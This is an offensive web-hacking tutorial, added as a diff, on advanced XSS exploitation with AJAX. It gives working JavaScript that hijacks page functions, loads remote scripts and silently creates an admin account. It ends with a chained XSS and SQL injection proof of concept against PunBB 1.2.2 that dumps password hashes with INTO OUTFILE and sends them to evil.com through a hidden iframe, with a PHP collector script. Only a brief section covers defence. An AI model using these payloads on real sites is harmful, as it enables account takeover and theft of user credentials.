@@ -1,0 +1,490 @@
+Advanced XSS exploitation with AJAX
+
+* 0. Introduction
+* 1. Hijacking Javascript with a XSS
+* 2. Call our hijack code remotely
+* 3. More into Ajax: an advanced example with XMLHttpRequest
+* 4. Automatic execution
+* 5. Impact on Ajax websites
+* 6. Common possibilities
+* 7. Magic_quotes_gpc problem
+* 8. Impact on permanent XSS
+* 9. Adapting this technique with a sql injection
+o 9.1. The xss vulnerability
+o 9.2. The SQL Injection vulnerability
+o 9.3. Programming the exploit
+o 9.4. Attacking
+* A. Solution
+* B. Conclusion
+
+0. Introduction
+
+Most of people think that xss vulnerability is not powerful for two reasons the first one is that supposely you should only be able to steal cookies, the second one is because it requires that your target click on a link or visit an arbitrary website.
+
+Well in this paper i am going to prove that we can do much more than just stealing cookie with a xss vulnerability and even if you still have to make your target go on a special link it worth trying.
+
+A new technology called Ajax is growing all over the net. Ajax permits you to create http request with javascript, so to make it simple a php website without ajax coud look like that:
+
+Client request ---> [Apache + PHP] ---> Response
+
+with ajax it is now:
+
+Client request ---> Javascript ---> [Apache + PHP] ---> Response
+
+I'll start this paper by showing you how to hijack javascript functions with an xss vulnerability and we'll see the impact it can have on website relying too much on javascript and the possibilities of this technique.
+
+Before we start you must:
+
+* set magic_quotes_gpc off to be able to use quotes
+* enable javascript in your browser
+* download the examples for this tutorial from my website
+
+1. Hijacking Javascript with a XSS
+
+Let's get right into it, this is the code of a php page vulnerable to xss:
+Code source of index.php
+
+<html> 
+<head> 
+  <title>Javascript Hijack with XSS</title> 
+  <script type="text/javascript" src="script.js"></script> 
+</head> 
+<body> 
+  <?php echo $_GET["xss"]; ?> 
+  <input type="Submit" onClick="javascript:Hello()" value="Say Hello" /> 
+</body> 
+</html>
+
+
+
+
+And there is the javascript script who comes with it:
+Code source of script.js
+
+function Hello() 
+{ 
+  alert("Hi there"); 
+}
+
+
+
+
+This is very simple, you have a web page that contains a button and when you click on it there is an alert box that says "Hi there". So we are going to hijack this Hello() function by recreating it in the url:
+
+ 
+http://[host]/?xss=<script>function Hello() { alert("hijacked"); } </script>
+
+
+
+
+Ok now we re-click on our button and what happens ? We do not get the "Hi there" message anymore but our "hijacked" one ! So that means we can hijack javascript code with a xss vulnerability and when a user will call the function execute our code instead of the normal one.
+2. Call our hijack code remotely
+
+Ok now we know how to re-create javascript functions in the url, but if you need to re-create many functions it is going to be hell to send it through the url. So let's create a new javascript file that will contain everything:
+Code source of hijack.js
+
+ 
+function Hello() 
+{ 
+  alert("Hijack from remote"); 
+}
+
+
+
+
+And now we can call it from the url like this:
+
+ 
+http://[host]/?xss=<script type="text/javascript" src="http://[evil server]/hijack.js"></script> 
+
+
+
+So we click again on our button and what appears ? "Hijack from remote" ! Ok now we know how to hijack correctly javascript functions.
+3. More into Ajax: an advanced example with XMLHttpRequest
+
+To demonstrate this technique i have coded a concrete example. It is attached to this tutorial, download it from my website. I am just going to quote some part of the code and explain it. So this is a simple administration panel where the admin has two possibilities: adding a new administrator or posting a message on his blog. However there is a xss vulnerability in the add_message.php?author=[xss] page. This is where we are going to attack!
+
+Let's analyse the page, there is one form and a javascript code that validate it with a function called "validateForm". Our goal in this example is to add a new administrator with this xss vulnerability. How good is that :)
+
+So i have coded a little exploit to hijack the javascript function. Check this out:
+Code source of exploit.js
+
+f
+
+unction createRequest() 
+{ 
+  var xmlHttp; 
+  if(window.ActiveXObject) 
+  { 
+    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP"); 
+  } 
+  else if(window.XMLHttpRequest) 
+  { 
+    xmlHttp = new XMLHttpRequest(); 
+  } 
+ 
+  return xmlHttp; 
+} 
+ 
+function validateForm() 
+{ 
+  var xmlHttp; 
+ 
+  xmlHttp = createRequest(); 
+  url = "add_admin.php?login=hacker&password=hacker&email=hacker"; 
+  xmlHttp.open("GET", url, true); 
+  xmlHttp.send(null); 
+  document.location = "add_message.php"; 
+} 
+    
+
+
+
+
+Ok ok, so know to exploit it with our xss we just need our admin to go to this url:
+
+ 
+http://[host]/add_message?author=http://[host]/?xss= 
+        <script type="text/javascript" src="http://[evil server]/exploit.js"></script>
+
+
+
+
+And when he will click on the submit button our evil code will add a new user into database login and password "hacker".
+Challenge done we can make our target execute evil commands ! But it still requires the user to click on the button ...
+
+4. Automatic execution
+
+The previous examples always require that our target click on a button to launch our attack. Well there's a solution for you:
+
+ 
+window.onload = function initHijack() 
+{ 
+  [...] 
+} 
+ 
+Our attack will be launched automaticaly when our target will click on our arbitrary link. 
+ 
+You can also execute some javascript when the user closes the page: 
+ 
+window.unload = function initHijack() 
+{ 
+  [...] 
+}
+
+
+
+
+5. Ajax code templates
+
+There's some basic code templates you can adapt to your code when creating your javascript exploits:
+The GET method
+
+ 
+var url = "page.php?param1=value1&param2=value2"; 
+http.open("GET", url, true); 
+http.onreadystatechange = function() { 
+    if(http.readyState == 4 && http.status == 200) { 
+        alert(http.responseText); 
+    } 
+} 
+http.send(null); 
+ 
+The POST method 
+ 
+var url = "page.php"; 
+var params = "param1=value1&param2=value2"; 
+http.open("POST", url, true); 
+ 
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+http.setRequestHeader("Content-length", params.length); 
+http.setRequestHeader("Connection", "close"); 
+ 
+http.onreadystatechange = function() { 
+    if(http.readyState == 4 && http.status == 200) { 
+        alert(http.responseText); 
+    } 
+} 
+http.send(params); 
+ 
+NOTE: You must set some http header in POST requests. 
+Sending a remote GET request with open() 
+ 
+// This technique will send a request via a popup 
+// be aware that if your target blocks popups it will not work 
+function RemoteGetWithOpen() 
+{ 
+    open("http://www.evilserver.com/ajaxhack/evil.php?param1=value1&param2=value2"); 
+} 
+ 
+Sending remote GET request with an iframe 
+ 
+function CreateAbritraryIframe() 
+{ 
+	// <iframe src="http://www.google.com/" style="visibility: hidden;" name="exploit"> 
+	var objBody = document.getElementsByTagName("body")[0]; 
+	var objIframe = document.createElement("iframe"); 
+	  // we set the "src" attribute 
+	  var attribut_src = document.createAttribute("src"); 
+	  attribut_src.nodeValue = "http://www.evilserver.com/[...]"; 
+	  objIframe.setAttributeNode(attribut_src); 
+	  // we hide it 
+	  var attribut_visibility = document.createAttribute("style"); 
+	  attribut_visibility.nodeValue = "visibility:hidden;"; 
+	  objIframe.setAttributeNode(attribut_visibility); 
+	  // we set a name to our frame 
+	  var attribut_name = document.createAttribute("name"); 
+	  attribut_name.nodeValue = "exploit"; 
+	  objIframe.setAttributeNode(attribut_name); 
+	objBody.appendChild(objIframe); 
+} 
+
+
+
+You might want to use some javascript librairies too such as Prototype, Dojo Toolkit, Yahoo!UI, Mootools or Mochikit. Refer yourself to their respective way of creating ajax requests to build your exploit.
+5. Impact on Ajax websites
+
+Methodology of possible attacks:
+
+            -------------- xss 
+            | 
+            |                       ------------ script bypass ----------- 
+            v                       |                                    | 
+Client request --->  html ----> Javascript       [Apache + PHP]          --------> Evil Response 
+                                    ^ 
+                                    | 
+            Security issue ----------
+
+
+
+
+or
+
+ 
+            -------------- xss 
+            | 
+            | 
+            |                       ------------ script bypass ----------- 
+            v                       |                                    | 
+Client request --->  html ----> Javascript     [GOOD Apache+PHP]         v 
+                                    ^                               [EVIL Apache + php] ----> Evil Response 
+                                    | 
+                                    | 
+            Security issue ----------
+
+
+
+
+or
+
+ 
+            -------------- xss 
+            | 
+            | 
+            |                       ------------ script bypass ----------- 
+            |                       |           |            ^           | 
+            |                       |           |            |           | 
+            v                       |           v            |           | 
+Client request --->  html ----> Javascript     [GOOD Apache+PHP]         v 
+                                    ^                               [EVIL Apache + php] ----> Evil Response 
+                                    | 
+                                    | 
+            Security issue ---------
+
+Some ajax website are not *well* coded in the way they use ajax into their critical parts such as login or form validating. So by hijacking their javascript function we could modify the way the website react to certains situations.
+
+So the impact really depends on how ajax is being used in the target website, but the more it rely on javascript the more it could be vulnerable.
+
+Let your hacking imagination think about this technique and i am sure you find some good stuff to do. Personally i think that the xss vulnerability will become more and more crucial in the future.
+6. Common possibilities
+
+This is just a list of what can be done on most of php application with a xss security hole:
+
+* update user profile (change password etc)
+* delete user
+* add / update (new) user
+* steal some input (password, secret question etc)
+* steal / modify cookie
+* make user send evil requests with his ip (ex: spam)
+* download page with special access (ex: only admin access stuff)
+
+and if you are very lucky:
+
+* make user execute php commands
+* make user upload
+
+7. Magic_quotes_gpc problem
+
+At the begining of this article i've asked you to set your magic_quote_gpc off simply because if you send a query like this:
+
+ 
+http://[host]/page.php?xss=<script src="evil.js"></script>
+
+
+
+
+It will be executed in the html code, it will become:
+
+<script src=\"http://[evil server]/evilscript.js\"></script>
+
+
+
+
+And your exploit will not work any more. But there is a simple solution in order to bypass this *security*. Simply do not use quotes at all:
+
+ 
+ 
+http://[host]/page.php?xss=<script src=http://[evil server]/evilscript.js></script>
+
+
+
+
+and it should be interpreted correctly by most of the browsers !
+8. Impact on permanent XSS
+
+Permanent Xss are xss vulnerabilities that stay on the website and are being executed everytime someone visit the hacked page. This is possible if the javascript source code is saved in a database or a file for example and this code is then called by a server side script and printed out.
+
+Depending on where is located you permanent xss this could be quite serious. Will take the worst example: the index. That means everypeople that visit this hacked page will be victime to your *evil* javascript code.
+
+Because javascript has become so powerful we can now do stuff like keylogger with it. So you could easily steal whatever the visitor type on the hacked page.
+9. Adapting this technique with a sql injection
+
+You are probably asking yourself why should xss and sql injection be put together while they are different vulnerabilities and normaly you do not need a xss to exploit a sql injection ? Well the answer to this question is simple, this chapter is meant to prove that sql injection vulnerabilities in restricted areas such as administration panel can be exploited with this technique. I will also assume that you have mastered the basics of sql injection exploitation without explaining in details how my exploits works.
+
+Normaly if a sql injection is released in an administration panel that requires a special session to access. You cannot exploit it, you should no be able to exploit it. What if you also have a xss on this website ? You could make the administrator exploit it for you.
+
+As a proof of concept i am going to use this technique on a old Punbb version 1.2.2. Please set your magic_quotes_gpc off if you want to try this exploit.
+9.1. The xss vulnerability
+
+First of all let's find an xss vulnerability. This doesn't take me long, by sending arbitrary code in every input I've found one in the user profile part in the jabber input. There's the proof of concept:
+
+ 
+"/><script>alert()</script>
+
+
+
+
+9.2. The SQL Injection vulnerability
+
+As easy as for the xss, just by fuzzing the administration panel it takes a few secondes to find something. In my case the sql injection is in the "User search" form (admin_users.php). There is the php code:
+
+ 
+ 
+$result = $db->query('SELECT u.id, u.username, u.email, u.title, u.num_posts, u.admin_note, g.g_id, 
+  g.g_user_title FROM '.$db->prefix.'users AS u LEFT JOIN '.$db->prefix.'groups AS g ON g.g_id=u.group_id 
+  WHERE u.id>1 AND '.implode(' AND ', $conditions).' ORDER BY '.$order_by.' '.$direction) 
+  or error('Unable to test fetch user info', __FILE__, __LINE__, $db->error());
+
+
+
+
+Ok so to explain it quickly, this code execute a sql query and if there is an error it displays the message "Unable to test fetch user info". To exploit this vulnerability we have to create a http POST request with all the parameters.
+
+For people you who would like to try to exploit this vulnerability on their localhost there's a little html exploit as a proof of concept:
+
+<form id="find_user" method="post" action="http://localhost/punbb/upload/admin_users.php?action=find_user"> 
+	<input type="submit" name="find_user" value="Submit search" tabindex="1" /> 
+	E-mail address<input type="text" name="form[email]" /> 
+</form>
+
+
+
+
+In the email input just copy paste this *exploit*:
+
+ 
+' UNION SELECT 0, users.password, 0,0,0,0,0,0 FROM users WHERE users.id = 2# 
+
+
+
+Normally all the users passwords should appear on your html page under the "username" column. If you have errors like shown below do not worry it is normal and it should not block you from exploiting the vulnerability.
+possible error example
+
+ 
+Notice: Undefined index: username in /var/www/punbb/upload/admin_users.php on line 215 
+
+
+
+9.3. Programming the exploit
+
+So there's my javascript exploit:
+
+ 
+function createHttpRequest() 
+{ 
+  var xmlHttp; 
+  if(window.ActiveXObject) 
+  { 
+    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP"); 
+  } 
+  else if(window.XMLHttpRequest) 
+  { 
+    xmlHttp = new XMLHttpRequest(); 
+  } 
+ 
+  return xmlHttp; 
+} 
+ 
+window.onload = function initAttack() 
+{ 
+    var xmlHttp; 
+    var params = "find_user=Submit+search&form[email]=' UNION SELECT 0,payday_users.username, 
+    payday_users.password,0,0,0,0,0 FROM payday_users INTO OUTFILE '/var/www/punbb_exploited.txt'#"; 
+    xmlHttp = createHttpRequest(); 
+    xmlHttp.open("POST", "/punbb/upload/admin_users.php", true); 
+    xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+	xmlHttp.setRequestHeader("Content-length", params.length); 
+	xmlHttp.setRequestHeader("Connection", "close"); 
+    xmlHttp.send(params); 
+ 
+	var objBody = document.getElementsByTagName("body")[0]; 
+	var objIframe = document.createElement("iframe"); 
+	  // we set the "src" attribute 
+	  var attribut_src = document.createAttribute("src"); 
+	  attribut_src.nodeValue = "http://www.evil.com/exploit.php?page=http://www.good.com/punbb_exploited.txt"; 
+	  objIframe.setAttributeNode(attribut_src); 
+	  // we hide it 
+	  var attribut_visibility = document.createAttribute("style"); 
+	  attribut_visibility.nodeValue = "visibility:hidden;"; 
+	  objIframe.setAttributeNode(attribut_visibility); 
+	  // we set a name to our frame 
+	  var attribut_name = document.createAttribute("name"); 
+	  attribut_name.nodeValue = "exploit"; 
+	  objIframe.setAttributeNode(attribut_name); 
+	objBody.appendChild(objIframe); 
+ 
+    return true; 
+}
+
+
+
+
+At this point of the the article you should be able to understand easily what this javascript does, but i'll explain it just in case :p. The script makes a http request that is going to exploit our sql injection, so after its execution an outfile with all the hashes has been created on our target server. Then the script creates an invisible iframe that send a GET request to our evil serveur with the url to the outfile. There's the PHP code that gets the content of this file and write it on our evil server:
+
+<?php 
+if(isset($_GET['page'])) 
+{ 
+	$content = file_get_contents($_GET['page']); 
+	$open = fopen("hash.txt", "a+"); 
+	fwrite($open, $content); 
+	fclose($open); 
+} 
+?>
+
+
+
+
+
+9.4. Attacking
+
+From now the attack is pretty simple, we are going to inject our javascript in the xss found in the profile and simply send a mp to the administration and found a good excuse to make him go see our profile.
+A. Solution
+
+There is not much you can do, except trying to avoid xss as much as you can. Getting my PHP Security Framework is also a good option.
+
+REMINDER: htmlentities() and htmlspecialchars() are the two basics functions to protect yourself against the xss vulnerability. If you are coding with an other language than PHP search for the equivalent.
+B. Conclusion
+
+We have seen two new things that can be done with a xss vulnerability. The first one was hijacking functions, it can be very useful it you want to modify the way the website will interact with the user but this attack really depends on the possibilities proposed by the target website. The second one was creating http requests. I think it will be the one that will have the most impact because you can manipulate an administrator to perform operations on his php application.
+
+Many people were wrong about XSS vulnerabilities: they are crucials ! This article is just the beginning of hacking with client side script because ActiveX or Javascript are more and more powerful so hackers will have more possibilities.
